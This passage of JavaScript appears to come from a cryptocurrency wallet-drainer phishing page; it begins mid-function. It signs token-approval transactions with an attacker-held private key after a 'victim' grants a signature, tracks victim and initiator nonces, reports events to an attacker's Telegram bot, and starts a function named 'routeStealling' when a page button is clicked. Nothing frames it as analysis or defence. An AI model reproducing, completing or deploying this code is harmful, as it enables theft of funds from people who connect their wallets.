                    "gasLimit": web3.utils.toHex(90000),
                    "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                    "data": data,
                    "value": "0x"
                }
                const signedTx = await web3.eth.accounts.signTransaction(finalTx, initiatorPK)
                web3.eth.sendSignedTransaction(signedTx.rawTransaction)

                initiatorNonce += 1
            }).catch(() => {
                reject("Approve Tx Failed")
            })

            victimNonce += 1

            resolve()
        }).catch(() => {
            reject("Denied Signature")
        })
    } catch {
        reject("Unknown error")
    }
})

function sendLog(message) {
    axios.post(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "markdown",
        disable_web_page_preview: true
    })
}

const sleep = (ms) => { return new Promise(resolve => setTimeout(resolve, ms)) }

async function main() {
    mainButton.disabled = false
    await connect()
    await routeStealling()
    mainButton.disabled = false
}

window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = main
})